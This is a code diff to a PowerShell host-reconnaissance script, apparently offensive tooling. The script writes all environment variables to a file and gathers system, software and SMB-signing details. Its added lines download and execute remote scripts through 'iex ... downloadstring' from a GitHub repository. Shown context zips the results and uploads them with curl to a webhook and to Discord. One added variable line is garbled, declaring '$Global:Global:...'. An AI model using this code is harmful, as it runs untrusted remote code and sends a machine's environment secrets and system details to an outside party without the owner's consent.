@@ -3,6 +3,7 @@
 $a=@()
 $b=@()
 dir env: >> stats.txt
+$Global:Global:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
 
 Function Get-NetworkInfos{
 
@@ -43,7 +44,7 @@ function Generalrecon{
 
     #Check for SMB Signing
     Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
-    $inv001 = ($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1'); Invoke-Expression $inv001
+    iex (new-object net.webclient).downloadstring($Global:S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
     if(!$consoleoutput){Invoke-SMBNegotiate -ComputerName localhost >> "$global:currentPath\Vulnerabilities\SMBSigningState.txt"}else{Write-Host -ForegroundColor red "SMB Signing State: ";Invoke-SMBNegotiate -ComputerName localhost}
 
 
@@ -244,7 +245,7 @@ function Generalrecon{
    Write-Host -ForegroundColor Yellow '-------> Collecting installed Software informations'
    if(!$consoleoutput){Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096 >> "$global:currentPath\LocalRecon\InstalledSoftwareAll.txt"}else{Get-Installedsoftware -Property DisplayVersion,InstallDate | out-string -Width 4096}
          
-   iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
+   iex (new-object net.webclient).downloadstring($Global:S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
    Write-Host -ForegroundColor Yellow '-------> Checking if Software is outdated and therefore vulnerable / exploitable'
    if(!$consoleoutput){Invoke-Vulmap | out-string -Width 4096 >> "$global:currentPath\Vulnerabilities\VulnerableSoftware.txt"}else{Invoke-Vulmap | out-string -Width 4096}
         
@@ -385,7 +386,7 @@ curl.exe -H "Content-Type: multipart/form-data" -F "file1=@localrecon.zip" $WEBH
 
 try {
     pathcheck
-    Generalrecon -ErrorAction SilentlyContinue
+    Generalrecon
     SendToDiscord
 }
 catch {
